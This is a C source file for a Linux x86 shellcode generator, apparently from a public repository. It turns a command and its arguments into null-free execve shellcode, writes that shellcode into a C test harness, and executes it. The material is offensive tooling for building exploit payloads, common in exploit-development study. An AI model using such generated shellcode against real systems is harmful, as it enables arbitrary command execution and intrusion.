//https://gitlab.com/DeveloperC/Linux-x86-Shellcode-Generator
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void setup_pointer_array(FILE *f, int size);
void push_string(FILE* f, char* shellcode);

int main(int argc, char *argv[]) {
	if (argc > 1) {
		FILE *f = fopen("output.c", "w");
		//write to the file the C imports and setup the char* container
		fprintf(f, "#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\nvoid printHex(const char *s);\n\n//Assemlbly comments in NASM syntax.\nchar *shellcode=\"\\x31\\xc0\" //xor eax, eax\n");

		//push first arg(the command) onto the stack
		push_string(f, argv[1]);

		//push current stack point into ebx, aka pointer to argv[1]
		fprintf(f, "\"\\x89\\xe3\" //mov ebx, esp\n");

		//setup array which will contain pointers to the other args on the stack
		setup_pointer_array(f, (argc-1));

		//push each arg of the desired command onto stack, get the addr and then insert the addr into the argv[] array
		int i;
		for (i = 2; i < argc; i++) {
			push_string(f, argv[i]);
			//get the addr of the current string just pushed onto stack and then move the addr onto the argv[] array
			fprintf(f, "\"\\x89\\xe2\" //mov edx, esp\n\"\\x89\\x51\\x%x\" //mov [ecx+%d], edx\n", ((i-1)*4), ((i-1)*4));
		}

		//point the envp[] arg of execve to null
		//push execve sys call number(11) into eax, and call sys interupt to execute execve
		//write to file C code function to call the opcode shellcode char* output
		fprintf(f, "\"\\x50\" //push eax\n\"\\x89\\xe2\" //mov edx, esp\n\"\\xb0\\x0b\" //mov al, 11\n\"\\xcd\\x80\"; //int $0x80\n\nint main() {\n  printHex(shellcode);\n  printf(\"%%d Bytes.\\n\",strlen(shellcode));\n  int (*ret)() = (int(*)())shellcode;\n  ret();\n}\n\nvoid printHex(const char *s) {\n  while (*s)\n    printf(\"\\\\x%%02x\", (unsigned int) *s++ & 0xff);\n  printf(\"\\n\");\n}\n");
		fclose(f);
	} else {
		printf("Usage: ./shellcode_generator.out <desired command> <(OPTIONAL)desired args>... \n");
	}
}

void setup_pointer_array(FILE* f, int size) {
	//push null pointer arguement, as they will be elements in the array, the null pointers will be overwritten later with the elements addr after we know it from pushing them onto the stack
	//extra null pointer at the end to show the end of the array
	int i;
	for (i = 0; i < size; i++) {
		fprintf(f, "\"\\x50\" //push eax\n");
	}
	//push ebx onto the end of the array; as it is the first element of the array
	//and then save the addr of the array into ecx
	fprintf(f, "\"\\x53\" //push ebx\n\"\\x89\\xe1\" //mov ecx, esp\n");
}

void push_string(FILE* f, char* string) {
	//push hex of each char of the string in reverse order
	int left = strlen(string);
    
    //if the string isnt a multiple of 4, push enough bites to make whats left mutliple of 4.
    if (left%4 != 0) {
        //if odd i.e 1 or 3 in length
        int pushEAX = 1; 
        if (left%2 != 0) {
            //cheaty assembly to push 1 byte without a null byte but with a 00 terminator
            //load char into ax reg
            fprintf(f, "\"\\xb0\\x%x\" //movb al, '%c'\n", string[left-1], string[left-1]);
            //push ax, xor eax
            fprintf(f, "\"\\x50\" //push eax\n\"\\x31\\xc0\" //xor eax, eax\n");
            left = left - 1;
            pushEAX = 0;
        } 
        //push 2 bytes
        if (left%4 == 2) {
            //only need the push eax for the null if didnt push 1 byte
            if (pushEAX) {
                fprintf(f, "\"\\x50\" //push eax\n");
            }
            fprintf(f, "\"\\x66\\x68\\x%x\\x%x\" //pushw '%c%c'\n", string[left-2], string[left-1], string[left-2], string[left-1]);
            left = left - 2;
        }
    } else {//not needed as pushing the 1 char has a 00 terminator
        //push eax for null byte to show end of string
        fprintf(f, "\"\\x50\" //push eax\n");
    }   

    while ( left/4 > 0 ) {
		fprintf(f, "\"\\x68\\x%x\\x%x\\x%x\\x%x\" //push '%c%c%c%c'\n", string[left-4], string[left-3], string[left-2], string[left-1], string[left-4], string[left-3], string[left-2], string[left-1]);
		left = left - 4;
	}
}
